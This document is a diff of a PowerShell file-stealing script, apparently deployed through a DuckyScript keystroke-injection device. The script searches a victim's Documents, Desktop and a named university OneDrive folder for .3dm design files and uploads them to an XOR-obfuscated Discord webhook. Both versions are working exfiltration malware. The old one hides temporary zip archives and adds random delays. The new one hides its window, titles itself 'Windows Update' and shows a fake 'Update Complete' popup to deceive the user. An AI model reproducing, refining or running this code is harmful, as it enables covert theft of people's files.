@@ -1,96 +1,91 @@
-# XOR-encrypted webhook (better than Base64)
+[Console]::BackgroundColor = "Black" 
+[Console]::SetWindowSize(57, 5)
+[Console]::Title = "Windows Update"
+Clear-Host
+
+# Discord webhook (XOR-encrypted)
 $encryptedHook = "1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
 $xorKey = 0x55
-$hookurl = "https://discord.com/api/webhooks/" + (-join ($encryptedHook.ToCharArray() | ForEach-Object { [char]([byte][char]$_ -bxor $xorKey) }))
+$hookurl = "https://discord.com/api/webhooks/" + (-join ($encryptedHook.ToCharArray() | ForEach-Object { [char]([byte][char]$_ -bxor $xorKey) })
 
-# Lightweight web client (stealthier than Invoke-WebRequest)
-$webClient = New-Object System.Net.WebClient
+# Toggle for window visibility (passed from DuckyScript)
+param (
+    [string]$WindowVisibility = 'y'  # 'y' = hidden, 'n' = visible
+)
 
-# Target folders (customize if needed)
+# Hide/show window function
+function Set-WindowVisibility {
+    param ([string]$visibility)
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    
+    if ($visibility -eq 'y') {
+        if ($hwnd -ne [System.IntPtr]::Zero) {
+            $Type::ShowWindowAsync($hwnd, 0)  # 0 = SW_HIDE
+        }
+        else {
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $hwnd = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }).MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
+    else {
+        if ($hwnd -ne [System.IntPtr]::Zero) {
+            $Type::ShowWindowAsync($hwnd, 5)  # 5 = SW_SHOW
+        }
+    }
+}
+
+# Apply visibility setting
+Set-WindowVisibility -visibility $WindowVisibility
+
+# File search and exfiltration
+$fileExtensions = @("*.3dm")
 $foldersToSearch = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-function Invoke-StealthUpload {
-    param($FilePath)
+# Upload files to Discord
+function Send-ToDiscord {
+    param ([string]$filePath)
     try {
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
         $boundary = [System.Guid]::NewGuid().ToString()
-        $headers = @{ 
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
         
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $body = New-Object System.IO.MemoryStream
-        
-        $header = [System.Text.Encoding]::UTF8.GetBytes(
-            "--$boundary`r`n" +
-            "Content-Disposition: form-data; name=`"file1`"; filename=`"$(Split-Path $FilePath -Leaf)`"`r`n" +
-            "Content-Type: application/octet-stream`r`n`r`n"
-        )
-        $body.Write($header, 0, $header.Length)
-        $body.Write($fileBytes, 0, $fileBytes.Length)
-        
-        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
-        $body.Write($footer, 0, $footer.Length)
-        
-        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-        [void]$webClient.UploadData($hookurl, "POST", $body.ToArray())
+        $body = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`"",
+            "Content-Type: application/octet-stream`r`n",
+            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            "--$boundary--`r`n"
+        ) -join "`r`n"
+
+        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
     }
     catch { <# Silent failure #> }
-    finally { if ($body) { $body.Dispose() } }
 }
 
-function Exfiltrate {
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    
-    $maxZipSize = 25MB
-    $currentSize = 0
-    $zipName = "sys_" + (Get-Date).ToString("HHmmss") + ".zip"
-    $zipPath = Join-Path $env:TEMP $zipName
-    
-    try {
-        $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
-        [System.IO.File]::SetAttributes($zipPath, 'Hidden')
-        
-        foreach ($folder in $foldersToSearch) {
-            if (-not (Test-Path $folder)) { continue }
-            
-            Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-                if ($_.Length -lt 1KB) { return }
-                
-                if ($currentSize + $_.Length -gt $maxZipSize) {
-                    $zip.Dispose()
-                    Invoke-StealthUpload $zipPath
-                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-                    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 2000)
-                    
-                    $zipName = "sys_" + (Get-Date).ToString("HHmmss") + ".zip"
-                    $zipPath = Join-Path $env:TEMP $zipName
-                    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
-                    [System.IO.File]::SetAttributes($zipPath, 'Hidden')
-                    $currentSize = 0
-                }
-                
-                $entryName = $_.FullName.Substring($folder.Length + 1)
-                [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $entryName)
-                $currentSize += $_.Length
-            }
+foreach ($folder in $foldersToSearch) {
+    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        try {
+            Send-ToDiscord -filePath $_.FullName
+            Write-Host "[+] Uploaded: $($_.Name)" -ForegroundColor Green
         }
-        
-        if ((Test-Path $zipPath) -and (Get-ChildItem $zipPath).Length -gt 0) {
-            $zip.Dispose()
-            Invoke-StealthUpload $zipPath
+        catch {
+            Write-Host "[-] Failed: $($_.Name)" -ForegroundColor Red
         }
-    }
-    finally {
-        if ($zip) { $zip.Dispose() }
-        if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
-        $webClient.Dispose()
     }
 }
 
-# Randomized delay + execution
-Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)
-Exfiltrate
+# Completion notice
+if ($WindowVisibility -eq 'y') {
+    (New-Object -ComObject Wscript.Shell).Popup("Update Complete", 3, "Windows Update", 0x0)
+}
+else {
+    Write-Host "Exfiltration complete!" -ForegroundColor Green
+    Start-Sleep -Seconds 3
+}
